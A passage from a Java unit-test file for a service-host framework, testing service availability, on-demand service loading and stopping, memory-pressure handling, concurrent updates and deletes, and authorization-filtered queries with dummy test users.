this.host.waitForServiceAvailable(TestFactoryService.SomeFactoryService.SELF_LINK);\n        try {\n            // not a factory so will fail\n            this.host.startFactoryServicesSynchronously(new ExampleService());\n            throw new IllegalStateException(\"Should have failed\");\n        } catch (IllegalArgumentException e) {\n\n        }\n\n        try {\n            // does not have SELF_LINK/FACTORY_LINK so will fail\n            this.host.startFactoryServicesSynchronously(new MinimalFactoryTestService());\n            throw new IllegalStateException(\"Should have failed\");\n        } catch (IllegalArgumentException e) {\n\n        }\n    }\n\n    public static class SomeExampleService extends StatefulService {\n        public static final String FACTORY_LINK = UUID.randomUUID().toString();\n\n        public static Service createFactory() {\n            return FactoryService.create(SomeExampleService.class, SomeExampleServiceState.class);\n        }\n\n        public SomeExampleService() {\n            super(SomeExampleServiceState.class);\n        }\n\n        public static class SomeExampleServiceState extends ServiceDocument {\n            public String name;\n        }\n    }\n\n    @Test\n    public void registerForServiceAvailabilityBeforeAndAfterMultiple()\n            throws Throwable {\n        setUp(false);\n        int serviceCount = 100;\n        this.host.testStart(serviceCount * 3);\n        String[] links = new String[serviceCount];\n        for (int i = 0; i < serviceCount; i++) {\n            URI u = UriUtils.buildUri(this.host, UUID.randomUUID().toString());\n            links[i] = u.getPath();\n            this.host.registerForServiceAvailability(this.host.getCompletion(),\n                    u.getPath());\n            this.host.startService(Operation.createPost(u),\n                    ExampleService.createFactory());\n            this.host.registerForServiceAvailability(this.host.getCompletion(),\n                    u.getPath());\n        }\n        this.host.registerForServiceAvailability(this.host.getCompletion(),\n                links);\n\n        this.host.testWait();\n    }\n\n    @Test\n    public void registerForServiceAvailabilityWithReplicaBeforeAndAfterMultiple()\n            throws Throwable {\n        setUp(true);\n        this.host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS.toMicros(100));\n\n        String[] links = new String[]{\n                ExampleService.FACTORY_LINK,\n                ServiceUriPaths.CORE_AUTHZ_RESOURCE_GROUPS,\n                ServiceUriPaths.CORE_AUTHZ_USERS,\n                ServiceUriPaths.CORE_AUTHZ_ROLES,\n                ServiceUriPaths.CORE_AUTHZ_USER_GROUPS};\n\n        // register multiple factories, before host start\n        TestContext ctx = this.host.testCreate(links.length * 10);\n        for (int i = 0; i < 10; i++) {\n            this.host.registerForServiceAvailability(ctx.getCompletion(), true, links);\n        }\n        this.host.start();\n        this.host.testWait(ctx);\n\n        // register multiple factories, after host start\n        for (int i = 0; i < 10; i++) {\n            ctx = this.host.testCreate(links.length);\n            this.host.registerForServiceAvailability(ctx.getCompletion(), true, links);\n            this.host.testWait(ctx);\n        }\n\n        // verify that the new replica aware service available works with child services\n        int serviceCount = 10;\n        ctx = this.host.testCreate(serviceCount * 3);\n        links = new String[serviceCount];\n        for (int i = 0; i < serviceCount; i++) {\n            URI u = UriUtils.buildUri(this.host, UUID.randomUUID().toString());\n            links[i] = u.getPath();\n            this.host.registerForServiceAvailability(ctx.getCompletion(),\n                    u.getPath());\n            this.host.startService(Operation.createPost(u),\n                    ExampleService.createFactory());\n            this.host.registerForServiceAvailability(ctx.getCompletion(), true,\n                    u.getPath());\n        }\n        this.host.registerForServiceAvailability(ctx.getCompletion(),\n                links);\n\n        this.host.testWait(ctx);\n    }\n\n    public static class ParentService extends StatefulService {\n\n        public static final String FACTORY_LINK = \"/test/parent\";\n\n        public static Service createFactory() {\n            return FactoryService.create(ParentService.class);\n        }\n\n        public ParentService() {\n            super(ExampleServiceState.class);\n            super.toggleOption(ServiceOption.PERSISTENCE, true);\n        }\n    }\n\n    public static class ChildDependsOnParentService extends StatefulService {\n        public static final String FACTORY_LINK = \"/test/child-of-parent\";\n\n        public static Service createFactory() {\n            return FactoryService.create(ChildDependsOnParentService.class);\n        }\n\n        public ChildDependsOnParentService() {\n            super(ExampleServiceState.class);\n            super.toggleOption(ServiceOption.PERSISTENCE, true);\n        }\n\n        @Override\n        public void handleStart(Operation post) {\n            // do not complete post for start, until we see a instance of the parent\n            // being available. If there is an issue with factory start, this will\n            // deadlock\n            ExampleServiceState st = getBody(post);\n            String id = Service.getId(st.documentSelfLink);\n            String parentPath = UriUtils.buildUriPath(ParentService.FACTORY_LINK, id);\n            post.nestCompletion((o, e) -> {\n                if (e != null) {\n                    post.fail(e);\n                    return;\n                }\n                logInfo(\"Parent service started!\");\n                post.complete();\n            });\n            getHost().registerForServiceAvailability(post, parentPath);\n        }\n    }\n\n    @Test\n    public void registerForServiceAvailabilityWithCrossDependencies()\n            throws Throwable {\n        setUp(false);\n        this.host.startFactoryServicesSynchronously(ParentService.createFactory(),\n                ChildDependsOnParentService.createFactory());\n        String id = UUID.randomUUID().toString();\n        TestContext ctx = this.host.testCreate(2);\n        // start a parent instance and a child instance.\n        ExampleServiceState st = new ExampleServiceState();\n        st.documentSelfLink = id;\n        st.name = id;\n        Operation post = Operation\n                .createPost(UriUtils.buildUri(this.host, ParentService.FACTORY_LINK))\n                .setCompletion(ctx.getCompletion())\n                .setBody(st);\n        this.host.send(post);\n        post = Operation\n                .createPost(UriUtils.buildUri(this.host, ChildDependsOnParentService.FACTORY_LINK))\n                .setCompletion(ctx.getCompletion())\n                .setBody(st);\n        this.host.send(post);\n        ctx.await();\n\n        // we create the two persisted instances, and they started. Now stop the host and confirm restart occurs\n        this.host.stop();\n        this.host.setPort(0);\n        if (!VerificationHost.restartStatefulHost(this.host, true)) {\n            this.host.log(\"Failed restart of host, aborting\");\n            return;\n        }\n        this.host.startFactoryServicesSynchronously(ParentService.createFactory(),\n                ChildDependsOnParentService.createFactory());\n\n        // verify instance services started\n        ctx = this.host.testCreate(1);\n        String childPath = UriUtils.buildUriPath(ChildDependsOnParentService.FACTORY_LINK, id);\n        Operation get = Operation.createGet(UriUtils.buildUri(this.host, childPath))\n                .setCompletion(ctx.getCompletion());\n        this.host.send(get);\n        ctx.await();\n    }\n\n    @Test\n    public void queueRequestForServiceWithNonFactoryParent() throws Throwable {\n        setUp(false);\n        class DelayedStartService extends StatelessService {\n            @Override\n            public void handleStart(Operation start) {\n                getHost().schedule(() -> {\n                    start.complete();\n                }, 100, TimeUnit.MILLISECONDS);\n            }\n\n            @Override\n            public void handleGet(Operation get) {\n                get.complete();\n            }\n        }\n\n        Operation startOp = Operation.createPost(UriUtils.buildUri(this.host, \"/delayed\"));\n        this.host.startService(startOp, new DelayedStartService());\n\n        // Don't wait for the service to be started, because it intentionally takes a while.\n        // The GET operation below should be queued until the service's start completes.\n        Operation getOp = Operation\n                .createGet(UriUtils.buildUri(this.host, \"/delayed\"))\n                .setCompletion(this.host.getCompletion());\n        this.host.testStart(1);\n        this.host.send(getOp);\n        this.host.testWait();\n    }\n\n    @Test\n    public void serviceStopDueToMemoryPressure() throws Throwable {\n        setUp(true);\n        this.host.setAuthorizationService(new AuthorizationContextService());\n        this.host.setAuthorizationEnabled(true);\n\n        if (this.serviceCount >= 1000) {\n            this.host.setStressTest(true);\n        }\n\n        // Set the threshold low to induce it during this test, several times. This will\n        // verify that refreshing the index writer does not break the index semantics\n        LuceneDocumentIndexService\n                .setIndexFileCountThresholdForWriterRefresh(this.indexFileThreshold);\n\n        // set memory limit low to force service stop\n        this.host.setServiceMemoryLimit(ServiceHost.ROOT_PATH, 0.00001);\n        beforeHostStart(this.host);\n\n        this.host.setPort(0);\n        long delayMicros = TimeUnit.SECONDS\n                .toMicros(this.serviceCacheClearDelaySeconds);\n        this.host.setServiceCacheClearDelayMicros(delayMicros);\n\n        // disable auto sync since it might cause a false negative (skipped pauses) when\n        // it kicks in within a few milliseconds from host start, during induced pause\n        this.host.setPeerSynchronizationEnabled(false);\n        long delayMicrosAfter = this.host.getServiceCacheClearDelayMicros();\n        assertTrue(delayMicros == delayMicrosAfter);\n        this.host.start();\n\n        this.host.setSystemAuthorizationContext();\n        TestContext ctxQuery = this.host.testCreate(1);\n        String user = \"foo@bar.com\";\n        Query.Builder queryBuilder = Query.Builder.create()\n                .addFieldClause(ServiceDocument.FIELD_NAME_KIND, Utils.buildKind(ExampleServiceState.class));\n        AuthorizationSetupHelper.create()\n                .setHost(this.host)\n                .setUserEmail(user)\n                .setUserSelfLink(user)\n                .setUserPassword(user)\n                .setResourceQuery(queryBuilder.build())\n                .setCompletion((ex) -> {\n                    if (ex != null) {\n                        ctxQuery.failIteration(ex);\n                        return;\n                    }\n                    ctxQuery.completeIteration();\n                }).start();\n        ctxQuery.await();\n        String factoryLink = OnDemandLoadFactoryService.create(this.host);\n        URI factoryURI = UriUtils.buildUri(this.host, factoryLink);\n        this.host.resetSystemAuthorizationContext();\n\n        AtomicLong selfLinkCounter = new AtomicLong();\n        String prefix = \"instance-\";\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            s.documentSelfLink = prefix + selfLinkCounter.incrementAndGet();\n            o.setBody(s);\n        };\n\n        // Create a number of child services.\n        this.host.assumeIdentity(UriUtils.buildUriPath(UserService.FACTORY_LINK, user));\n\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null,\n                this.serviceCount,\n                ExampleServiceState.class, bodySetter, factoryURI);\n\n        // Wait for the next maintenance interval to trigger. This will stop all the services\n        // we just created since the memory limit was set so low.\n        long expectedStopTime = Utils.fromNowMicrosUtc(this.host\n                .getMaintenanceIntervalMicros() * 5);\n        while (this.host.getState().lastMaintenanceTimeUtcMicros < expectedStopTime) {\n            // memory limits are applied during maintenance, so wait for a few intervals.\n            Thread.sleep(this.host.getMaintenanceIntervalMicros() / 1000);\n        }\n\n        // Let's now issue some updates to verify stopped services get started.\n        int updateCount = 100;\n        if (this.testDurationSeconds > 0 || this.host.isStressTest()) {\n            updateCount = 1;\n        }\n        patchExampleServices(states, updateCount);\n\n        TestContext ctxGet = this.host.testCreate(states.size());\n        for (ExampleServiceState st : states.values()) {\n            Operation get = Operation.createGet(UriUtils.buildUri(this.host, st.documentSelfLink))\n                    .setCompletion(\n                            (o, e) -> {\n                                if (e != null) {\n                                    this.host.failIteration(e);\n                                    return;\n                                }\n\n                                ExampleServiceState rsp = o.getBody(ExampleServiceState.class);\n                                if (!rsp.name.startsWith(\"updated\")) {\n                                    ctxGet.fail(new IllegalStateException(Utils\n                                            .toJsonHtml(rsp)));\n                                    return;\n                                }\n                                ctxGet.complete();\n                            });\n            this.host.send(get);\n        }\n        this.host.testWait(ctxGet);\n\n        // Let's set the service memory limit back to normal and issue more updates to ensure\n        // that the services still continue to operate as expected.\n        this.host\n                .setServiceMemoryLimit(ServiceHost.ROOT_PATH, ServiceHost.DEFAULT_PCT_MEMORY_LIMIT);\n        patchExampleServices(states, updateCount);\n\n        states.clear();\n        // Long running test. Keep adding services, expecting stop to occur and free up memory so the\n        // number of service instances exceeds available memory.\n        Date exp = new Date(TimeUnit.MICROSECONDS.toMillis(\n                Utils.getSystemNowMicrosUtc())\n                + TimeUnit.SECONDS.toMillis(this.testDurationSeconds));\n\n        this.host.setOperationTimeOutMicros(\n                TimeUnit.SECONDS.toMicros(this.host.getTimeoutSeconds()));\n\n        while (new Date().before(exp)) {\n            states = this.host.doFactoryChildServiceStart(null,\n                    this.serviceCount,\n                    ExampleServiceState.class, bodySetter, factoryURI);\n            Thread.sleep(500);\n\n            this.host.log(\"created %d services, created so far: %d, attached count: %d\",\n                    this.serviceCount,\n                    selfLinkCounter.get(),\n                    this.host.getState().serviceCount);\n            Runtime.getRuntime().gc();\n            this.host.logMemoryInfo();\n\n            File f = new File(this.host.getStorageSandbox());\n            this.host.log(\"Sandbox: %s, Disk: free %d, usable: %d, total: %d\", f.toURI(),\n                    f.getFreeSpace(),\n                    f.getUsableSpace(),\n                    f.getTotalSpace());\n\n            // let a couple of maintenance intervals run\n            Thread.sleep(TimeUnit.MICROSECONDS.toMillis(this.host.getMaintenanceIntervalMicros()) * 2);\n\n            // ping every service we created to see if they can be started\n            TestContext getCtx = this.host.testCreate(states.size());\n            for (URI u : states.keySet()) {\n                Operation get = Operation.createGet(u).setCompletion((o, e) -> {\n                    if (e == null) {\n                        getCtx.complete();\n                        return;\n                    }\n\n                    if (o.getStatusCode() == Operation.STATUS_CODE_TIMEOUT) {\n                        // check the document index, if we ever created this service\n                        try {\n                            this.host.createAndWaitSimpleDirectQuery(\n                                    ServiceDocument.FIELD_NAME_SELF_LINK, o.getUri().getPath(), 1, 1);\n                        } catch (Throwable e1) {\n                            getCtx.fail(e1);\n                            return;\n                        }\n                    }\n                    getCtx.fail(e);\n                });\n                this.host.send(get);\n            }\n            this.host.testWait(getCtx);\n\n            long limit = this.serviceCount * 30;\n            if (selfLinkCounter.get() <= limit) {\n                continue;\n            }\n\n            TestContext ctxDelete = this.host.testCreate(states.size());\n            // periodically, delete services we created (and likely stopped) several passes ago\n            for (int i = 0; i < states.size(); i++) {\n                String childPath = UriUtils.buildUriPath(factoryURI.getPath(), prefix + \"\"\n                        + (selfLinkCounter.get() - limit + i));\n                Operation delete = Operation.createDelete(this.host, childPath);\n                delete.setCompletion((o, e) -> {\n                    ctxDelete.complete();\n                });\n                this.host.send(delete);\n            }\n            ctxDelete.await();\n        }\n    }\n\n    @Test\n    public void maintenanceForOnDemandLoadServices() throws Throwable {\n        setUp(true);\n\n        long maintenanceIntervalMillis = 100;\n        long maintenanceIntervalMicros = TimeUnit.MILLISECONDS\n                .toMicros(maintenanceIntervalMillis);\n\n        // induce host to clear service state cache\n        this.host.setMaintenanceIntervalMicros(maintenanceIntervalMicros);\n        this.host.setServiceCacheClearDelayMicros(maintenanceIntervalMicros / 2);\n        this.host.start();\n\n        EnumSet<ServiceOption> caps = EnumSet.of(ServiceOption.PERSISTENCE,\n                ServiceOption.INSTRUMENTATION, ServiceOption.FACTORY_ITEM);\n\n        // Start the factory service. it will be needed to start services on-demand\n        MinimalFactoryTestService factoryService = new MinimalFactoryTestService();\n        factoryService.setChildServiceCaps(caps);\n        this.host.startServiceAndWait(factoryService, \"service\", null);\n\n        // Start some test services\n        this.host.doThroughputServiceStart(this.serviceCount,\n                MinimalTestService.class, this.host.buildMinimalTestState(), caps, null);\n\n        // guarantee at least a few maintenance intervals have passed.\n        Thread.sleep(maintenanceIntervalMillis * 10);\n\n        // Let's verify now that all of the services have stopped by now.\n        this.host.waitFor(\n                \"Service stats did not get updated\",\n                () -> {\n                    Map<String, ServiceStat> stats = this.host.getServiceStats(this.host\n                            .getManagementServiceUri());\n\n                    ServiceStat cacheClears = stats\n                            .get(ServiceHostManagementService.STAT_NAME_SERVICE_CACHE_CLEAR_COUNT);\n                    if (cacheClears == null || cacheClears.latestValue < this.serviceCount) {\n                        this.host.log(\n                                \"Service Cache Clears %s were less than expected %d\",\n                                cacheClears == null ? \"null\" : String\n                                        .valueOf(cacheClears.latestValue),\n                                this.serviceCount);\n                        return false;\n                    }\n\n                    return true;\n                });\n    }\n\n    private void patchExampleServices(Map<URI, ExampleServiceState> states, int count)\n            throws Throwable {\n        TestContext ctx = this.host.testCreate(states.size() * count);\n        for (ExampleServiceState st : states.values()) {\n            for (int i = 0; i < count; i++) {\n                st.name = \"updated\" + Utils.getNowMicrosUtc() + \"\";\n                Operation patch = Operation\n                        .createPatch(UriUtils.buildUri(this.host, st.documentSelfLink))\n                        .setCompletion((o, e) -> {\n                            if (e != null) {\n                                ctx.fail(e);\n                                return;\n                            }\n                            ctx.complete();\n                        }).setBody(st);\n                this.host.send(patch);\n            }\n        }\n        this.host.testWait(ctx);\n    }\n\n    @Test\n    public void onDemandServiceStopCheckWithReadAndWriteAccess() throws Throwable {\n        for (int i = 0; i < this.iterationCount; i++) {\n            tearDown();\n            doOnDemandServiceStopCheckWithReadAndWriteAccess();\n        }\n    }\n\n    private void doOnDemandServiceStopCheckWithReadAndWriteAccess() throws Throwable {\n        setUp(true);\n\n        long maintenanceIntervalMicros = TimeUnit.MILLISECONDS.toMicros(100);\n\n        // induce host to stop service more often by setting maintenance interval short\n        this.host.setMaintenanceIntervalMicros(maintenanceIntervalMicros);\n        this.host.setServiceCacheClearDelayMicros(maintenanceIntervalMicros / 2);\n        this.host.start();\n\n        // Start some test services\n        EnumSet<ServiceOption> caps = EnumSet.of(ServiceOption.PERSISTENCE,\n                ServiceOption.FACTORY_ITEM);\n\n        MinimalFactoryTestService factoryService = new MinimalFactoryTestService();\n        factoryService.setChildServiceCaps(caps);\n        this.host.startServiceAndWait(factoryService, \"/service\", null);\n\n        // Test DELETE works on ODL service as it works on non-ODL service.\n        // Delete on non-existent service should succeed, and should not leave any side effects behind.\n        Operation deleteOp = Operation.createDelete(this.host, \"/service/foo\")\n                .setBody(new ServiceDocument());\n        this.host.sendAndWaitExpectSuccess(deleteOp);\n\n        // create a service\n        MinimalTestServiceState initialState = new MinimalTestServiceState();\n        initialState.id = \"foo\";\n        initialState.documentSelfLink = \"/foo\";\n        Operation startPost = Operation\n                .createPost(UriUtils.buildUri(this.host, \"/service\"))\n                .setBody(initialState);\n        this.host.sendAndWaitExpectSuccess(startPost);\n\n        String servicePath = \"/service/foo\";\n\n        // wait for the service to be stopped.\n        // This verifies that a service will stop while it is idle for some duration\n        this.host.waitFor(\"Waiting for service to be stopped\",\n                () -> this.host.getServiceStage(servicePath) == null\n        );\n\n        int requestCount = 10;\n        int requestDelayMills = 40;\n\n        // send 10 GET request 40ms apart to make service receive GET request during a couple\n        // of maintenance windows\n        TestContext testContextForGet = this.host.testCreate(requestCount);\n        for (int i = 0; i < requestCount; i++) {\n            Operation get = Operation\n                    .createGet(this.host, servicePath)\n                    .setCompletion(testContextForGet.getCompletion());\n            this.host.send(get);\n            Thread.sleep(requestDelayMills);\n        }\n        testContextForGet.await();\n\n        // wait for the service to be stopped\n        this.host.waitFor(\"Waiting for service to be stopped\",\n                () -> this.host.getServiceStage(servicePath) == null\n        );\n\n        // send 10 update request 40ms apart to make service receive PATCH request during a couple\n        // of maintenance windows\n        TestContext ctx = this.host.testCreate(requestCount);\n        for (int i = 0; i < requestCount; i++) {\n            Operation patch = createMinimalTestServicePatch(servicePath, ctx);\n            this.host.send(patch);\n            Thread.sleep(requestDelayMills);\n        }\n        ctx.await();\n\n        // wait for the service to be stopped\n        this.host.waitFor(\"Waiting for service to be stopped\",\n                () -> this.host.getServiceStage(servicePath) == null\n        );\n\n        double maintCount = getHostMaintenanceCount();\n        // issue multiple PATCHs while directly stopping the service to induce collision\n        // of stop with active requests. First prevent automatic stop by extending\n        // cache clear time\n        this.host.setServiceCacheClearDelayMicros(TimeUnit.DAYS.toMicros(1));\n        this.host.waitFor(\"wait for main.\", () -> {\n            double latestCount = getHostMaintenanceCount();\n            return latestCount > maintCount + 1;\n        });\n\n\n        // first cause a start\n        Operation patch = createMinimalTestServicePatch(servicePath, null);\n        this.host.sendAndWaitExpectSuccess(patch);\n\n        assertEquals(ProcessingStage.AVAILABLE, this.host.getServiceStage(servicePath));\n\n        requestCount = this.requestCount;\n        // service is started. issue updates in parallel and then stop service while requests are\n        // still being issued\n        ctx = this.host.testCreate(requestCount);\n        for (int i = 0; i < requestCount; i++) {\n            patch = createMinimalTestServicePatch(servicePath, ctx);\n            this.host.send(patch);\n            if (i == Math.min(10, requestCount / 2)) {\n                Operation deleteStop = Operation.createDelete(this.host, servicePath)\n                        .addPragmaDirective(Operation.PRAGMA_DIRECTIVE_NO_INDEX_UPDATE);\n                this.host.send(deleteStop);\n            }\n        }\n        ctx.await();\n\n        verifyOnDemandLoadUpdateDeleteContention();\n    }\n\n    void verifyOnDemandLoadUpdateDeleteContention() throws Throwable {\n        Operation patch;\n        Consumer<Operation> bodySetter = (o) -> {\n            ExampleServiceState body = new ExampleServiceState();\n            body.name = \"prefix-\" + UUID.randomUUID();\n            o.setBody(body);\n        };\n        String factoryLink = OnDemandLoadFactoryService.create(this.host);\n\n        // before we start service attempt a GET on a ODL service we know does not\n        // exist. Make sure its handleStart is NOT called (we will fail the POST if handleStart\n        // is called, with no body)\n\n        Operation get = Operation.createGet(UriUtils.buildUri(\n                this.host, UriUtils.buildUriPath(factoryLink, \"does-not-exist\")));\n        this.host.sendAndWaitExpectFailure(get, Operation.STATUS_CODE_NOT_FOUND);\n\n        // create another set of services\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(\n                null,\n                this.serviceCount,\n                ExampleServiceState.class,\n                bodySetter,\n                UriUtils.buildUri(this.host, factoryLink));\n\n        // set aggressive cache clear again so ODL services stop\n        // temporarily disabled - https://jira-hzn.eng.vmware.com/browse/VRXEN-21\n        /*\n        double nowCount = getHostMaintenanceCount();\n        this.host.setServiceCacheClearDelayMicros(this.host.getMaintenanceIntervalMicros() / 2);\n        this.host.waitFor(\"wait for main.\", () -> {\n            double latestCount = getHostMaintenanceCount();\n            return latestCount > nowCount + 1;\n        });\n        */\n\n        // now patch these services, while we issue deletes. The PATCHs can fail, but not\n        // the DELETEs\n        TestContext patchAndDeleteCtx = this.host.testCreate(states.size() * 2);\n        patchAndDeleteCtx.setTestName(\"Concurrent PATCH / DELETE on ODL\").logBefore();\n        for (Entry<URI, ExampleServiceState> e : states.entrySet()) {\n            patch = Operation.createPatch(e.getKey())\n                    .setBody(e.getValue())\n                    .setCompletion((o, ex) -> {\n                        patchAndDeleteCtx.complete();\n                    });\n            this.host.send(patch);\n            // in parallel send a DELETE\n            this.host.send(Operation.createDelete(e.getKey())\n                    .setCompletion(patchAndDeleteCtx.getCompletion()));\n        }\n        patchAndDeleteCtx.await();\n        patchAndDeleteCtx.logAfter();\n    }\n\n    double getHostMaintenanceCount() {\n        Map<String, ServiceStat> hostStats = this.host.getServiceStats(\n                UriUtils.buildUri(this.host, ServiceHostManagementService.SELF_LINK));\n        ServiceStat stat = hostStats.get(Service.STAT_NAME_SERVICE_HOST_MAINTENANCE_COUNT);\n        if (stat == null) {\n            return 0.0;\n        }\n        return stat.latestValue;\n    }\n\n    Operation createMinimalTestServicePatch(String servicePath, TestContext ctx) {\n        MinimalTestServiceState body = new MinimalTestServiceState();\n        body.id = Utils.buildUUID(\"foo\");\n        Operation patch = Operation\n                .createPatch(UriUtils.buildUri(this.host, servicePath))\n                .setBody(body);\n        if (ctx != null) {\n            patch.setCompletion(ctx.getCompletion());\n        }\n        return patch;\n    }\n\n    private ServiceStat getRateLimitOpCountStat() throws Throwable {\n        URI managementServiceUri = this.host.getManagementServiceUri();\n        return this.host.getServiceStats(managementServiceUri)\n                .get(ServiceHostManagementService.STAT_NAME_RATE_LIMITED_OP_COUNT);\n    }\n\n    @Test\n    public void thirdPartyClientPost() throws Throwable {\n        setUp(false);\n        this.host.waitForServiceAvailable(ExampleService.FACTORY_LINK);\n\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        long c = 1;\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, c,\n                ExampleServiceState.class, bodySetter, factoryURI);\n\n        String contentType = Operation.MEDIA_TYPE_APPLICATION_JSON;\n        for (ExampleServiceState initialState : states.values()) {\n            String json = this.host.sendWithJavaClient(\n                    UriUtils.buildUri(this.host, initialState.documentSelfLink), contentType, null);\n            ExampleServiceState javaClientRsp = Utils.fromJson(json, ExampleServiceState.class);\n            assertTrue(javaClientRsp.name.equals(initialState.name));\n        }\n\n        // Now issue POST with third party client\n        s.name = UUID.randomUUID().toString();\n        String body = Utils.toJson(s);\n        // first use proper content type\n        String json = this.host.sendWithJavaClient(factoryURI,\n                Operation.MEDIA_TYPE_APPLICATION_JSON, body);\n        ExampleServiceState javaClientRsp = Utils.fromJson(json, ExampleServiceState.class);\n        assertTrue(javaClientRsp.name.equals(s.name));\n\n        // POST to a service we know does not exist and verify our request did not get implicitly\n        // queued, but failed instantly instead\n\n        json = this.host.sendWithJavaClient(\n                UriUtils.extendUri(factoryURI, UUID.randomUUID().toString()),\n                Operation.MEDIA_TYPE_APPLICATION_JSON, null);\n\n        ServiceErrorResponse r = Utils.fromJson(json, ServiceErrorResponse.class);\n        assertEquals(Operation.STATUS_CODE_NOT_FOUND, r.statusCode);\n    }\n\n    private URI[] buildStatsUris(long serviceCount, List<Service> services) {\n        URI[] statUris = new URI[(int) serviceCount];\n        int i = 0;\n        for (Service s : services) {\n            statUris[i++] = UriUtils.extendUri(s.getUri(),\n                    ServiceHost.SERVICE_URI_SUFFIX_STATS);\n        }\n        return statUris;\n    }\n\n    @Test\n    public void queryServiceUris() throws Throwable {\n        setUp(false);\n        int serviceCount = 5;\n        this.host.createExampleServices(this.host, serviceCount, Utils.getNowMicrosUtc());\n\n        EnumSet<ServiceOption> options = EnumSet.of(ServiceOption.INSTRUMENTATION,\n                ServiceOption.OWNER_SELECTION, ServiceOption.FACTORY_ITEM);\n\n        Operation get = Operation.createGet(this.host.getUri());\n        final ServiceDocumentQueryResult[] results = new ServiceDocumentQueryResult[1];\n\n        get.setCompletion((o, e) -> {\n            if (e != null) {\n                this.host.failIteration(e);\n                return;\n            }\n            results[0] = o.getBody(ServiceDocumentQueryResult.class);\n            this.host.completeIteration();\n        });\n\n        // use path prefix match\n        this.host.testStart(1);\n        this.host.queryServiceUris(ExampleService.FACTORY_LINK + \"/*\", get.clone());\n        this.host.testWait();\n        assertEquals(serviceCount, results[0].documentLinks.size());\n        assertEquals((long) serviceCount, (long) results[0].documentCount);\n\n        this.host.testStart(1);\n        this.host.queryServiceUris(options, true, get.clone());\n        this.host.testWait();\n        assertEquals(serviceCount, results[0].documentLinks.size());\n        assertEquals((long) serviceCount, (long) results[0].documentCount);\n        this.host.testStart(1);\n        this.host.queryServiceUris(options, false, get.clone());\n        this.host.testWait();\n        assertTrue(results[0].documentLinks.size() >= serviceCount);\n        assertEquals((long) results[0].documentLinks.size(), (long) results[0].documentCount);\n    }\n\n    @Test\n    public void queryServiceUrisWithAuth() throws Throwable {\n        setUp(true);\n        this.host.setAuthorizationService(new AuthorizationContextService());\n        this.host.setAuthorizationEnabled(true);\n        this.host.start();\n\n        AuthTestUtils.setSystemAuthorizationContext(this.host);\n\n        // Start Statefull with Non-Persisted service\n        this.host.startFactory(new ExampleNonPersistedService());\n        this.host.waitForServiceAvailable(ExampleNonPersistedService.FACTORY_LINK);\n\n        TestRequestSender sender = this.host.getTestRequestSender();\n\n        // create user foo@example.com who has access to ExampleServiceState with name=\"foo\"\n        TestContext createUserFoo = this.host.testCreate(1);\n        String userFoo = \"foo@example.com\";\n        AuthorizationSetupHelper.create()\n                .setHost(this.host)\n                .setUserEmail(userFoo)\n                .setUserSelfLink(userFoo)\n                .setUserPassword(\"password\")\n                .setResourceQuery(Query.Builder.create()\n                        .addFieldClause(ServiceDocument.FIELD_NAME_KIND, Utils.buildKind(ExampleServiceState.class))\n                        .addFieldClause(ExampleServiceState.FIELD_NAME_NAME, \"foo\")\n                        .build())\n                .setCompletion(createUserFoo.getCompletion())\n                .start();\n        createUserFoo.await();\n\n        // create user bar@example.com who has access to ExampleServiceState with name=\"foo\"\n        TestContext createUserBar = this.host.testCreate(1);\n        String userBar = \"bar@example.com\";\n        AuthorizationSetupHelper.create()\n                .setHost(this.host)\n                .setUserEmail(userBar)\n                .setUserSelfLink(userBar)\n                .setUserPassword(\"password\")\n                .setResourceQuery(Query.Builder.create()\n                        .addFieldClause(ServiceDocument.FIELD_NAME_KIND, Utils.buildKind(ExampleServiceState.class))\n                        .addFieldClause(ExampleServiceState.FIELD_NAME_NAME, \"bar\")\n                        .build())\n                .setCompletion(createUserBar.getCompletion())\n                .start();\n        createUserBar.await();\n\n        // create foo & bar documents\n        ExampleServiceState exampleFoo = new ExampleServiceState();\n        exampleFoo.name = \"foo\";\n        exampleFoo.documentSelfLink = \"foo\";\n\n        ExampleServiceState exampleBar = new ExampleServiceState();\n        exampleBar.name = \"bar\";\n        exampleBar.documentSelfLink = \"bar\";\n\n        List<Operation> posts = new ArrayList<>();\n        posts.add(Operation.createPost(this.host, ExampleNonPersistedService.FACTORY_LINK).setBody(exampleFoo));\n        posts.add(Operation.createPost(this.host, ExampleNonPersistedService.FACTORY_LINK).setBody(exampleBar));\n        sender.sendAndWait(posts);\n\n        AuthTestUtils.resetAuthorizationContext(this.host);\n\n        // login as foo\n        AuthTestUtils.loginAndSetToken(this.host, \"foo@example.com\", \"password\");\n\n        Operation factoryGetFoo = Operation.createGet(this.host, ExampleNonPersistedService.FACTORY_LINK);\n        ServiceDocumentQueryResult factoryGetResultFoo = sender.sendAndWait(factoryGetFoo, ServiceDocumentQueryResult.class);\n        assertEquals(1, factoryGetResultFoo.documentLinks.size());\n        assertEquals(\"/core/nonpersist-examples/foo\", factoryGetResultFoo.documentLinks.get(0));\n\n\n        // login as bar\n        AuthTestUtils.loginAndSetToken(this.host, \"bar@example.com\", \"password\");\n        Operation factoryGetBar = Operation.createGet(this.host, ExampleNonPersistedService.FACTORY_LINK);\n        ServiceDocumentQueryResult factoryGetResultBar = sender.sendAndWait(factoryGetBar, ServiceDocumentQueryResult.class);\n        assertEquals(1, factoryGetResultBar.documentLinks.size());\n        assertEquals(\"/core/nonpersist-examples/bar\", factoryGetResultBar.documentLinks.get(0));\n    }\n\n    /**\n     * This test verify the custom Ui path resource of service\n     **/\n    @Test\n    public void testServiceCustomUIPath() throws Throwable {\n        setUp(false);\n        String resourcePath = \"customUiPath\";\n        // Service with custom path\n        class CustomUiPathService extends StatelessService {\n            public static final String SELF_LINK = \"/custom\";\n\n            public CustomUiPathService() {\n                super();\n                toggleOption(ServiceOption.HTML_USER_INTERFACE, true);\n            }\n\n            @Override\n            public ServiceDocument getDocumentTemplate() {\n                ServiceDocument serviceDocument = new ServiceDocument();\n                serviceDocument.documentDescription = new ServiceDocumentDescription();\n                